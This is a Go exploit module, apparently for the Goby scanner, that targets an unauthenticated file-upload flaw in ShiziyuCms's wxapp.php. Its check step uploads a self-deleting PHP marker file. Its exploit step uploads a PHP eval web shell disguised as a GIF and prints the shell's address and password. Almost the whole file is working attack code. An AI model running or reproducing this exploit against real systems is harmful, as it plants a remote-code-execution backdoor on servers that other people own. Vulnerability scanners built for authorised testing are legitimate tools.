package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"regexp"
)

func init() {
	expJson := `{
  "Name": "ShiziyuCms wxapp.php File update",
  "Description": "ShiziyuCms wxapp.php File update,Attackers can upload malicious files without authentication",
  "Product": "ShiziyuCms",
  "Homepage": "https://shiziyu.cc/",
  "DisclosureDate": "2021-06-03",
  "Author": "PeiQi",
  "GobyQuery": "body=\"/seller.php?s=/Public/login\"",
  "Level": "3",
  "Impact": "<p>File upload</p>",
  "Recommendation": "Update patches in time",
  "RealReferences": [
    "http://wiki.peiqi.tech/PeiQi_Wiki"
  ],
  "HasExp": true,
  "ExpParams": null,
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [
    "File update"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "ShiziyuCms"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  },
  "Disable": false,
  "Recommandation": "<p>undefined</p>"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    randomStr := goutils.RandomHexString(8)
			uri := "/wxapp.php?controller=Goods.doPageUpload"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs")
			cfg.Data = "------WebKitFormBoundary8UaANmWAgM4BqBSs\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\r\nContent-Type: image/gif\r\n\r\n<?php echo '" + randomStr + "';unlink(__FILE__);?>\r\n------WebKitFormBoundary8UaANmWAgM4BqBSs-"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			    if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "image_o"){
			        addr := regexp.MustCompile(`\\/Uploads(.*?).php`).FindAllString(resp.Utf8Html, 2)[1]
			        addr = strings.Replace(addr, "\\/", "/", -1)
			        cfg_1 := httpclient.NewGetRequestConfig(addr)
        			cfg_1.VerifyTls = false
        			cfg_1.FollowRedirect = false
        			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				        return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randomStr)
        			}
			    }
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    randomStr := goutils.RandomHexString(8)
		    uri := "/wxapp.php?controller=Goods.doPageUpload"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs")
			cfg.Data = "------WebKitFormBoundary8UaANmWAgM4BqBSs\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\r\nContent-Type: image/gif\r\n\r\n<?php @eval($_REQUEST['" + randomStr + "']);?>\r\n------WebKitFormBoundary8UaANmWAgM4BqBSs-"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
			    if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "image_o"){
			        addr := regexp.MustCompile(`\\/Uploads(.*?).php`).FindAllString(resp.Utf8Html, 2)[1]
			        addr = strings.Replace(addr, "\\/", "/", -1)
    			    expResult.Output = "Webshell Addr: " + addr + "\r\n\r\nWebshell Pass: " + randomStr
            		expResult.Success = true
			    }
			}
			return expResult
		},
	))
}

